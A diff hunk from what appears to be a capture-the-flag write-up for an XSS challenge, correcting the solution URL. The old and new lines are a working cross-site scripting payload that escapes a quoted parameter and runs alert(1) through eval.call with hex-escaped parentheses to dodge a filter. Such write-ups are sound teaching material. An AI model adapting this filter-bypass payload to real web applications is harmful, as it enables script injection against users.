@@ -4,7 +4,7 @@ It was not possible to use [jjencode](utf-8.jp/public/jjencode.html), because pa
 
 Solution:
 ```
-http://xss2.sect.ctf.rocks/?xss=stuff%22;eval.call`${'alert\x281\x29)'}`;//
+http://xss2.sect.ctf.rocks/?xss=stuff%22;eval.call`${'alert\x281\x29'}`;//
 ```
 
 References:
